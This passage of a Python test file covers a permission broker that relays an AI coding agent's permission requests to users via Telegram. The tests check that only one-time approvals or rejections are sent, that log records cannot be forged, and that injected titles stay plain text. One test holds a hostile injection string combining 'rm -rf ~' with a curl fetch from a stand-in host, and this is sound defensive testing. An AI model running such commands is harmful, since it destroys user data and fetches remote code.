        # Then: it says where the asks come from, and it still sweeps
        assert "collector" in caplog.text
        await polling.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, TITLE, MASKS)
        await age(memory, APP, seconds=TIMEOUT_S + 1)
        assert await polling.sweep_timeouts() == 1
    finally:
        await asyncio.wait_for(polling.stop(), 1.0)
    assert server.answers() == [{"response": "reject"}]


# ---------------------------------------------------------------------------
# The mask list: logged, never granted
# ---------------------------------------------------------------------------


async def test_the_mask_list_is_logged_and_never_posted_anywhere(
    broker, server: FakeOpencode, telegram: Telegram, caplog
):
    """`properties.always` is a menu of rules the server would accept for the rest
    of the session. It exists here to be LOGGED -- an operator reading the log has
    to see what one durable grant would have bought -- and nowhere else."""
    # Given: an ask offering a mask that appears nowhere else
    with caplog.at_level(logging.INFO, logger="core.permissions"):
        await broker.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, TITLE, (EXCLUSIVE_MASK,))
        # When: it is answered
        await broker.resolve_from_text(APP, "да")
    # Then: the mask is in the log
    assert EXCLUSIVE_MASK in caplog.text
    # And it reached nobody: not the opencode wire, not Telegram
    assert all(EXCLUSIVE_MASK not in json.dumps(body) for body in server.answers())
    assert all(EXCLUSIVE_MASK not in body["text"] for body in telegram.bodies)
    # And this is not vacuous: the log names the ask the mask belongs to
    assert TITLE in caplog.text


async def test_no_ask_is_ever_answered_with_a_mask_the_server_offered(
    broker, memory: Memory, server: FakeOpencode, telegram: Telegram
):
    """All three ways an ask gets answered -- yes, no, timeout -- with a mask
    offered each time. Every body is a single key."""
    # Given: three users, three asks, three masks
    for index, app_id in enumerate((APP, OTHER_APP, "carol-789")):
        await broker.on_permission_requested(
            app_id, SESSION_ID, f"per_{index}", f"cmd {index}", (f"cmd {index} *",)
        )
    # When: one is approved, one is refused, and the third is left to time out
    assert await broker.resolve_from_text(APP, "да") == "approved"
    assert await broker.resolve_from_text(OTHER_APP, "нет") == "rejected"
    await age(memory, "carol-789", seconds=TIMEOUT_S + 1)
    assert await broker.sweep_timeouts() == 1
    # Then
    assert [body["response"] for body in server.answers()] == ["once", "reject", "reject"]
    for body in server.answers():
        assert list(body) == ["response"]


# ---------------------------------------------------------------------------
# Prompt injection: the title is text, never a command
# ---------------------------------------------------------------------------


async def test_a_title_full_of_shell_metacharacters_is_only_ever_text(
    broker, server: FakeOpencode, telegram: Telegram
):
    """`title` comes from the server and from an LLM that was told to run
    something. It is never interpolated into a command, a path or a URL here: it
    goes into a Telegram message and a JSON blob, and the URL the broker builds
    comes from the ids alone."""
    # Given: an ask whose title is a shell injection attempt
    hostile = "; rm -rf ~ #\n$(curl evil.example/x)\n`id`"
    await broker.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, hostile, ("*",))
    # When: it is approved
    await broker.resolve_from_text(APP, "да")
    # Then: the URL the broker built carries no trace of it, and the body is one key
    post = server.answer_posts()[0]
    assert hostile not in post.url.path
    assert hostile not in post.url.query.decode()
    assert json.loads(post.content) == {"response": "once"}
    # And the title reached the user verbatim, as text
    assert telegram.texts()[0] == QUESTION.format(title=hostile)


async def test_a_title_with_newlines_cannot_split_the_log_record(broker, telegram: Telegram, caplog):
    """A log record is one line, and `title` is server-controlled: a newline in it
    would let anything the server sends forge a second record a reader trusts. The
    one line is the `%r` the log renders the title with, which escapes control
    characters -- this test exists so that changing it to `%s` fails here."""
    # Given: an ask whose title tries to close the record and open a new one
    forged = "WARNING: forged by the server"
    with caplog.at_level(logging.INFO, logger="core.permissions"):
        await broker.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, f"echo hi\n{forged}", MASKS)
    # Then: it reaches exactly one record, and that record renders as a single line.
    # `getMessage()` is the unformatted template, so the rendered text is what a log
    # reader actually sees -- and that is where a newline would split the record.
    rendered = [logging.Formatter("%(message)s").format(record) for record in caplog.records]
    lines = [text for text in rendered if forged in text]
    assert len(lines) == 1
    assert "\n" not in lines[0]


async def test_a_title_carrying_the_routing_token_never_reaches_the_chat(
    broker, server: FakeOpencode, telegram: Telegram, cfg: Config
):
    """The routing token is internal protocol between the voice agent and the
    brain, and the title is SERVER-controlled text built from whatever the user
    asked for. A user who typed the token into a command would otherwise have it
    read back to them as a raw protocol marker -- the D4 leak arriving by the
    broker's door instead of the worker's. The guard removes the token and keeps
    the sentence, because the question is still the user's to answer."""
    # Given: an ask whose title carries the token the collectors strip
    token = cfg.r2d2_needs_agent_sentinel
    hostile = f"выполни {token} потом ls"
    await broker.on_permission_requested(APP, SESSION_ID, PERMISSION_ID, hostile, ("*",))
    # Then: the question reads as prose with the token gone and the rest intact
    asked = telegram.texts()[0]
    assert token not in asked
    assert "потом ls" in asked
    # And the acceptance notice passes through the same guarded boundary
    await broker.resolve_from_text(APP, "да")
    assert all(token not in text for text in telegram.texts())


# ---------------------------------------------------------------------------
# Static guard: the source itself
# ---------------------------------------------------------------------------


def test_the_module_cannot_answer_with_a_durable_grant():
    """Read the source, not a mock. Four independent properties, each of which
    catches a different future edit:

    1. the answer domain is the two-value `Literal`, so a durable grant is not a
       value this module can even hold -- and the client's own `Literal` agrees;
    2. every call into the one seam that reaches the server passes a named
       constant: never a raw string, never an expression, never a third name;
    3. there is exactly ONE call to `respond_permission` in the file, so no second
       path to the wire was built differently;
    4. flat text: no `response="always"`, no `remember`, and in fact not the word
       `response` at all -- the client's parameter is the only place that names it.
    """
    from core import permissions
    from core.permissions import ANSWERS, APPROVE_ONCE, DURABLE_GRANT, REFUSE, PermissionAnswer

    source = Path(permissions.__file__).read_text(encoding="utf-8")
    tree = ast.parse(source)

    # 1. the answer domain, and the client's own view of it
    assert set(get_args(PermissionAnswer)) == {"once", "reject"}
    assert (APPROVE_ONCE, REFUSE) == ("once", "reject")
    assert ANSWERS == {"once", "reject"}
    assert DURABLE_GRANT not in ANSWERS
    assert set(get_args(get_type_hints(OpencodeClient.respond_permission)["response"])) == {
        "once",
        "reject",
    }

    # 2. every path into the seam names one of those two constants
    posted = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call) and getattr(node.func, "attr", None) == "_post"
    ]
    assert len(posted) == 4, "all four answer paths must go through the one seam"
    for call in posted:
        assert isinstance(call.args[1], ast.Name), "an answer is a named constant, never a raw string"
        assert call.args[1].id in {"APPROVE_ONCE", "REFUSE", "answer"}

    # 3. one call to the route, forwarding the typed parameter
    routes = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call) and getattr(node.func, "attr", None) == "respond_permission"
    ]
    assert len(routes) == 1
    assert isinstance(routes[0].args[2], ast.Name) and routes[0].args[2].id == "answer"

    # 4. flat text
    assert re.search(r"""response\s*=\s*['"](?:always|once)['"]""", source) is None
    assert "remember" not in source
    assert "response" not in source


def test_the_seam_carries_the_answer_domain_and_nothing_wider():
    """    The seam's parameter is annotated with the two-value `Literal`, so a third
    value is a type error at the call site rather than a review question."""
    from core.permissions import PermissionAnswer, PermissionBroker

    hints = get_type_hints(PermissionBroker._post)
    assert hints["answer"] == PermissionAnswer
